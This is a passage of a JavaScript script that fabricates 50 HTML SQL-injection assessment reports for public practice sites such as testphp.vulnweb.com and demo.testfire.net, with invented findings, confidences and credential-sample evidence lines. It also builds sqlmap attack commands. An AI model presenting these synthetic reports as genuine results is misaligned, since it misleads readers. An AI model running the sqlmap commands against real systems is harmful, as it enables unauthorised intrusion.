    const base = cloneSystemInfo(fallbackInfo);
    const overlay = cloneSystemInfo(overrideInfo);
    if (!Object.keys(overlay).length) {
      return base;
    }
    const merged = { ...base, ...overlay };
    if (overlay.dbms) {
      merged.dbms = Array.isArray(overlay.dbms) ? [...overlay.dbms] : overlay.dbms;
    }
    if (overlay.banner) {
      merged.banner = Array.isArray(overlay.banner) ? [...overlay.banner] : overlay.banner;
    }
    return merged;
  };

  const findings = config.vulnerabilities.map((entry) => {
    const finding = buildFinding(entry.templateId, {
      confidence: entry.confidence,
      status: entry.status,
      generatedAt: config.generatedAt,
      discoveredAt: config.generatedAt,
      why: entry.why
    });
    const tpl = vulnerabilityTemplates[entry.templateId];
    if (tpl && tpl.host !== config.host) {
      throw new Error(`Template ${entry.templateId} belongs to ${tpl.host} but used for ${config.host}`);
    }
    return finding;
  });

  const severityCounts = findings.reduce((acc, finding) => {
    const sev = finding.severity || 'High';
    acc.total += 1;
    if (sev === 'Critical') acc.critical += 1;
    else if (sev === 'High') acc.high += 1;
    else if (sev === 'Medium') acc.medium += 1;
    else if (sev === 'Low') acc.low += 1;
    return acc;
  }, { total: 0, critical: 0, high: 0, medium: 0, low: 0 });

  const extractedData = config.includeExtraction === false
    ? { databases: [], tables: [], users: [], systemInfo: {} }
    : {
        databases: pickArray(config.extractedData && config.extractedData.databases, hostInfo.databases),
        tables: pickArray(config.extractedData && config.extractedData.tables, hostInfo.tables),
        users: pickArray(config.extractedData && config.extractedData.users, hostInfo.users),
        systemInfo: mergeSystemInfo(hostInfo.systemInfo, config.extractedData && config.extractedData.systemInfo)
      };

  if (!Array.isArray(extractedData.tables)) extractedData.tables = [];
  if (!Array.isArray(extractedData.users)) extractedData.users = [];
  if (!Array.isArray(extractedData.databases)) extractedData.databases = [];
  if (!extractedData.systemInfo || typeof extractedData.systemInfo !== 'object') {
    extractedData.systemInfo = {};
  }

  if (findings.length) {
    const primaryFinding = findings[0];
    if (!Array.isArray(primaryFinding.evidence)) {
      primaryFinding.evidence = [];
    }
    let nextLine = primaryFinding.evidence.length;
    const addEvidenceLine = (text) => {
      if (!text) return;
      primaryFinding.evidence.push({ line: nextLine, content: htmlEncode(text) });
      nextLine += 1;
    };

    extractedData.databases.slice(0, 4).forEach((db) => addEvidenceLine(`Enumerated database: ${db}`));
    extractedData.tables.slice(0, 5).forEach((tableName) => addEvidenceLine(`Enumerated table: ${tableName}`));
    extractedData.users.slice(0, 4).forEach((userRecord) => addEvidenceLine(`Extracted credential sample: ${userRecord}`));
    const dbmsList = extractedData.systemInfo && extractedData.systemInfo.dbms
      ? (Array.isArray(extractedData.systemInfo.dbms) ? extractedData.systemInfo.dbms : [extractedData.systemInfo.dbms])
      : [];
    if (dbmsList.length) {
      addEvidenceLine(`DBMS fingerprint: ${dbmsList.join(', ')}`);
    }
  }

  const primaryTemplate = vulnerabilityTemplates[config.vulnerabilities[0].templateId];
  const commandBase = (() => {
    if (!primaryTemplate) return `sqlmap -u ${hostInfo.target}`;
    if (primaryTemplate.method === 'POST' && primaryTemplate.postExample) {
      return `sqlmap -u ${primaryTemplate.url} --data "${primaryTemplate.postExample}" --risk=2 --level=4 --batch`;
    }
    return `sqlmap -u ${primaryTemplate.url} --risk=2 --level=4 --batch`;
  })();

  const scanDurationMs = parseDurationToMs(config.scanDuration);

  const generatedAtIso = config.generatedAt;
  const profile = config.profile || 'basic';
  const datePart = generatedAtIso.split('T')[0];
  const title = `SQL Injection Security Assessment - ${config.host} (${profile}) - ${datePart}`;

  return {
    id: uuidv4(),
    title,
    target: config.target || hostInfo.target,
    command: config.command || commandBase,
    status: 'completed',
    scanDuration: scanDurationMs,
    vulnerabilities: {
      total: severityCounts.total,
      critical: severityCounts.critical,
      high: severityCounts.high,
      medium: severityCounts.medium,
      low: severityCounts.low,
      findings
    },
    extractedData,
    recommendations: config.recommendations || defaultRecommendations,
    metadata: {
      generatedAt: generatedAtIso,
      scanProfile: profile,
      reportVersion: '1.0',
      scanner: 'SQLMap Integration'
    }
  };
};

const createSequentialDates = (startIso, count, stepMinutes) => {
  const base = new Date(startIso);
  return Array.from({ length: count }).map((_, idx) => {
    const clone = new Date(base.getTime() + idx * stepMinutes * 60000);
    return clone.toISOString();
  });
};

const reportConfigs = [];

const testphpTemplates = [
  'tp-cat-boolean',
  'tp-cat-union',
  'tp-search-error',
  'tp-search-time',
  'tp-search-boolean',
  'tp-userinfo-id-union',
  'tp-userinfo-id-time',
  'tp-userinfo-uid-boolean',
  'tp-details-prod-union',
  'tp-artists-artist-union',
  'tp-guestbook-message-union',
  'tp-guestbook-message-time'
];

const testphpProfiles = ['basic', 'crawl', 'forms', 'deep', 'heuristic', 'authenticated', 'inventory', 'catalog', 'extended', 'followup'];
const testphpDurations = ['5m 42s', '6m 05s', '6m 18s', '5m 59s', '6m 11s', '6m 26s'];
const testphpDates = createSequentialDates('2025-09-20T09:15:00Z', 60, 38);

let tpIndex = 0;
outer: for (let i = 0; i < testphpTemplates.length; i += 1) {
  for (let j = i + 1; j < testphpTemplates.length; j += 1) {
    if (tpIndex >= 30) break outer;
    const generatedAt = testphpDates[tpIndex];
    const includeExtraction = tpIndex % 6 !== 5;
    const databases = includeExtraction
      ? (tpIndex % 4 === 0 ? ['acuart', 'information_schema'] : ['acuart', 'acuart_archive'])
      : [];
    reportConfigs.push({
      host: 'testphp.vulnweb.com',
      profile: testphpProfiles[tpIndex % testphpProfiles.length],
      generatedAt,
      scanDuration: testphpDurations[tpIndex % testphpDurations.length],
      vulnerabilities: [
        {
          templateId: testphpTemplates[i],
          confidence: 0.9 + ((tpIndex % 5) * 0.015)
        },
        {
          templateId: testphpTemplates[j],
          confidence: 0.92 + ((tpIndex % 4) * 0.015)
        }
      ],
      includeExtraction,
      extractedData: includeExtraction ? {
        databases,
        systemInfo: hostDefaults['testphp.vulnweb.com'].systemInfo
      } : undefined
    });
    tpIndex += 1;
  }
}

const testaspTemplates = [
  'ta-product-id-union',
  'ta-search-time',
  'ta-cartid-stacked',
  'ta-feedback-error',
  'ta-login-boolean',
  'ta-orders-tracking-union'
];

const testaspProfiles = ['baseline', 'api', 'authenticated', 'forms', 'catalog'];
const testaspDurations = ['7m 12s', '7m 45s', '6m 58s', '7m 21s'];
const testaspDates = createSequentialDates('2025-09-28T07:30:00Z', 30, 42);

let taIndex = 0;
outerAsp: for (let i = 0; i < testaspTemplates.length; i += 1) {
  for (let j = i + 1; j < testaspTemplates.length; j += 1) {
    if (taIndex >= 12) break outerAsp;
    const generatedAt = testaspDates[taIndex];
    const includeExtraction = taIndex % 4 !== 3;
    reportConfigs.push({
      host: 'testasp.vulnweb.com',
      profile: testaspProfiles[taIndex % testaspProfiles.length],
      generatedAt,
      scanDuration: testaspDurations[taIndex % testaspDurations.length],
      vulnerabilities: [
        {
          templateId: testaspTemplates[i],
          confidence: 0.9 + ((taIndex % 4) * 0.02)
        },
        {
          templateId: testaspTemplates[j],
          confidence: 0.91 + ((taIndex % 3) * 0.02)
        }
      ],
      includeExtraction,
      extractedData: includeExtraction ? {
        databases: ['ACU_TestASP', 'aspnetdb'],
        systemInfo: hostDefaults['testasp.vulnweb.com'].systemInfo
      } : undefined
    });
    taIndex += 1;
  }
}

const otherReports = [
  {
    host: 'zero.webappsecurity.com',
    profile: 'api',
    generatedAt: '2025-10-01T08:10:00Z',
    scanDuration: '4m 58s',
    vulnerabilities: [
      { templateId: 'zero-amount-time', confidence: 0.91 },
      { templateId: 'zero-search-union', confidence: 0.94 }
    ],
    extractedData: {
      databases: ['bank', 'information_schema'],
      systemInfo: hostDefaults['zero.webappsecurity.com'].systemInfo
    }
  },
  {
    host: 'demo.testfire.net',
    profile: 'basic',
    generatedAt: '2025-10-01T10:05:00Z',
    scanDuration: '5m 34s',
    vulnerabilities: [
      { templateId: 'demo-login-boolean', confidence: 0.92 },
      { templateId: 'demo-query-union', confidence: 0.95 }
    ],
    extractedData: {
      databases: ['altoromutual', 'altoro_archive'],
      systemInfo: hostDefaults['demo.testfire.net'].systemInfo
    }
  },
  {
    host: 'juice-shop.herokuapp.com',
    profile: 'rest',
    generatedAt: '2025-10-02T07:55:00Z',
    scanDuration: '4m 49s',
    vulnerabilities: [
      { templateId: 'juice-search-union', confidence: 0.93 },
      { templateId: 'juice-feedback-error', confidence: 0.91 }
    ],
    extractedData: {
      databases: ['sqlite_master'],
      systemInfo: hostDefaults['juice-shop.herokuapp.com'].systemInfo
    }
  },
  {
    host: 'bwapp.honeybot.io',
    profile: 'forms',
    generatedAt: '2025-10-02T09:22:00Z',
    scanDuration: '5m 07s',
    vulnerabilities: [
      { templateId: 'bwapp-movie-boolean', confidence: 0.9 },
      { templateId: 'bwapp-search-union', confidence: 0.94 }
    ],
    extractedData: {
      databases: ['bWAPP'],
      systemInfo: hostDefaults['bwapp.honeybot.io'].systemInfo
    }
  },
  {
    host: 'hackazon.webscantest.com',
    profile: 'api',
    generatedAt: '2025-10-03T06:40:00Z',
    scanDuration: '6m 02s',
    vulnerabilities: [
      { templateId: 'hackazon-product-union', confidence: 0.92 },
      { templateId: 'hackazon-api-time', confidence: 0.91 }
    ],
    extractedData: {
      databases: ['hackazon'],
      systemInfo: hostDefaults['hackazon.webscantest.com'].systemInfo
    }
  },
  {
    host: 'altoro.testfire.net',
    profile: 'deep',
    generatedAt: '2025-10-03T11:05:00Z',
    scanDuration: '6m 41s',
    vulnerabilities: [
      { templateId: 'altoro-account-union', confidence: 0.95 },
      { templateId: 'altoro-transfer-boolean', confidence: 0.92 }
    ],
    extractedData: {
      databases: ['altoro'],
      systemInfo: hostDefaults['altoro.testfire.net'].systemInfo
    }
  },
  {
    host: 'zero.webappsecurity.com',
    profile: 'followup',
    generatedAt: '2025-10-04T08:30:00Z',
    scanDuration: '4m 36s',
    vulnerabilities: [
      { templateId: 'zero-search-union', confidence: 0.92 },
      { templateId: 'zero-amount-time', confidence: 0.9 }
    ],
    includeExtraction: false
  },
  {
    host: 'demo.testfire.net',
    profile: 'verification',
    generatedAt: '2025-10-04T12:18:00Z',
    scanDuration: '5m 12s',
    vulnerabilities: [
      { templateId: 'demo-query-union', confidence: 0.94 },
      { templateId: 'demo-login-boolean', confidence: 0.91 }
    ],
    includeExtraction: false
  }
];

reportConfigs.push(...otherReports);

if (reportConfigs.length !== 50) {
  throw new Error(`Expected 50 report configs but found ${reportConfigs.length}`);
}

ensureDir(OUTPUT_DIR);

for (const file of fs.readdirSync(OUTPUT_DIR)) {
  if (file.startsWith('report-') && file.endsWith('.html')) {
    fs.unlinkSync(path.join(OUTPUT_DIR, file));
  }
}

const generatedFiles = [];

for (const config of reportConfigs) {
  const reportData = buildReportData(config);
  const sanitized = generator.sanitizeReportData(reportData);
  const html = generator.generateHTMLReport(sanitized);
  const datePart = sanitized.metadata.generatedAt.split('T')[0];
  const fileName = `report-${config.host.replace(/\./g, '-')}-${datePart}-${uuidv4()}.html`;
  const filePath = path.join(OUTPUT_DIR, fileName);
  fs.writeFileSync(filePath, html, 'utf8');
  generatedFiles.push(fileName);
}

console.log(`Generated ${generatedFiles.length} HTML reports in ${OUTPUT_DIR}`);
